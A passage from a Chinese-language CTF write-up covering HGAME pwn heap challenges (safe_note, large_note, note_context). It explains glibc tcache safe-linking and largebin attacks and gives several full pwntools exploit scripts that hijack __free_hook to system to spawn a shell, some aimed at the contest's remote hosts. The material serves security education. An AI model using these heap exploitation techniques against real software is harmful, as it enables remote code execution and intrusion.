class="number">0x7fe8d8e28e48</span> (__free_hook) ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6730</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6730</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>申请到<code>__free_hook</code>为<code>system</code>，释放数据为<code>/bin/sh</code>的堆块即可。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30439</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">&#x27;protectt&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xa0</span>,p64(free_hook)*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(system))</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h2><h3 id="libc-2-32预备知识"><a href="#libc-2-32预备知识" class="headerlink" title="libc-2.32预备知识"></a>libc-2.32预备知识</h3><ul><li>引入了<code>-safe-linking(异或加密)</code>机制，其核心思想是：将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或，该操作在堆块<strong>进入和退出</strong><code>tcache bin</code>时进行：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><ul><li><code>chunk</code>放入<code>tcache bin</code>时，其<code>fd</code>指针会进行<code>异或加密</code>，其<code>bk</code>指针会放入<code>tcache</code>，以防<code>double free</code>。</li><li><code>chunk</code>从<code>tcache bin</code>被取出时，其<code>fd</code>指针进行<code>反异或操作</code>，其<code>bk</code>指针清零。</li><li>以下图为例了解<code>-safe-linking</code>：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png" style="zoom:80%;" /><ul><li>当第一个<code>chunk</code>进入<code>tcache bin</code>时，由于<code>tcache</code>此时为空，故<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0</code>。</li><li>当第二个<code>chunk</code>进入<code>tcache bin</code>时，<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0x559f965652a0</code>。</li><li>第三个同理：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x559f96565&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f965652a0</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf37c5&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965653c0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f96565330</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf3655&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>不难想到<code>(0x559f965652a0 &gt;&gt; 12)</code>就是第一次<code>free chunk</code>的<code>fd</code>指针，一直参与异或，这也是有些师傅们常说的<code>key</code>。</li></ul><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe_note"></a>safe_note</h3><p><code>libc-2.32</code>环境下带有<code>edit</code>功能的<code>uaf</code>漏洞题目，除了环境不同，其余功能均与<code>WEEK2-pwn-editable_note</code>一致。</p><ul><li>申请9个<code>0x80</code>大小堆块，释放7个装满<code>tcache bin</code>，再释放一个进入<code>unsorted bin</code>，泄露<code>libc_base</code>即可。<strong>注：puts函数可能被低位‘\x00’截断，可以用edit进行调整。</strong></li><li>泄露第一个<code>free chunk</code>的<code>fd</code>指针即<code>key</code>，将<code>key</code>与<code>__free_hook</code>异或，加密结果在取出时便会得到真实的<code>__free_hook</code>地址。</li><li>修改第七个<code>free_chunk</code>的<code>fd</code>指针为<code>__free_hook</code>加密结果，再申请两次堆块得到<code>__free_hook</code>地址的控制权，写入<code>system</code>即可。</li><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30852</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12</span>-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">bd=free_hook^key</span><br><span class="line">edit(<span class="number">6</span>,p64(bd))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="large-note"><a href="#large-note" class="headerlink" title="large_note"></a>large_note</h3><p><code>uaf</code>题型，涉及<code>libc2.32</code>下的<code>house of corruption</code>利用，主要适用于申请<code>largebin</code>大小的<code>chunk</code>题型，利用<code>house of corruption</code>可以改大一个已知地址。</p><blockquote><p><a href="https://www.anquanke.com/post/id/244018#h2-0">参考博客</a></p></blockquote><p>该题中<code>add</code>堆块的范围在<code>0x500 ~ 0x900</code>之间，释放的堆块无法进入<code>tcache</code>：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png" style="zoom: 80%;" /><p>用于利用实现<code>house of corruption</code>的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请一个<code>0x520</code>大小的堆块，再申请一个<code>0x500</code>大小的堆块避免合并，再申请一个<code>0x510</code>大小的堆块用于后续触发上述代码（需小于第一个堆块）。</li><li>释放掉第一个堆块并泄露<code>libc基址</code>，其进入<code>unsortedbin</code>，如果下一个申请的堆块大于<code>0x520</code>，则位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，否则被切割利用。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png" style="zoom:80%;" /><ul><li>因此申请一个<code>0x600（必须大于0x520）</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png" style="zoom:80%;" /><ul><li>修改<code>largebin chunk</code>的<code>bk-&gt;nextsize</code>为目标地址<code>target-0x20</code>，此处我们的<code>target</code>选择<code>mp_+80</code>即存储<code>tcachebin</code>数量的地址，初试为<code>64</code>，涵盖<code>0x10 ~ 0x400</code>，我们要将其改成一个大值。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png" style="zoom:80%;" /><ul><li>释放第三个堆块，其进入<code>unsortedbin</code>，故技重施再申请一个<code>0x600</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，触发<code>house of corruption</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png" style="zoom:80%;" /><ul><li>此时再释放的堆块都会进入<code>tcachebin</code>，利用<code>double free</code>完成对<code>__free_hook</code>的劫持即可。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png" style="zoom:80%;" /><ul><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=lb+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>相比于上题开了沙箱黑名单，禁用了<code>execve</code>。<code>rdi</code>转<code>rdx</code>后<code>setcontext+61</code>一把梭：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdi2rdx</span></span><br><span class="line">.text:<span class="number">000000000014B</span>760 <span class="number">48</span> <span class="number">8B</span> <span class="number">57</span> <span class="number">08</span>                   mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000014B</span>764 <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                   mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">.text:<span class="number">000000000014B</span>768 FF <span class="number">52</span> <span class="number">20</span>                      call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setcontext+61</span></span><br><span class="line">.text:<span class="number">000000000005306</span>D <span class="number">48</span> <span class="number">8B</span> A2 A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">9</span>A <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">6</span>A <span class="number">78</span>                   mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">62</span> <span class="number">48</span>                   mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">6</span>A <span class="number">50</span>                   mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">72</span> <span class="number">58</span>                   mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">7</span>A <span class="number">60</span>                   mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">64</span> F7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>+test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">000000000005309B</span> <span class="number">0F</span> <span class="number">84</span> B5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_53156</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000000053156</span>                               loc_53156:                              ; CODE XREF: setcontext+<span class="number">6B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000053156</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D <span class="number">51</span>                            push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">72</span> <span class="number">70</span>                   mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">7</span>A <span class="number">68</span>                   mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span 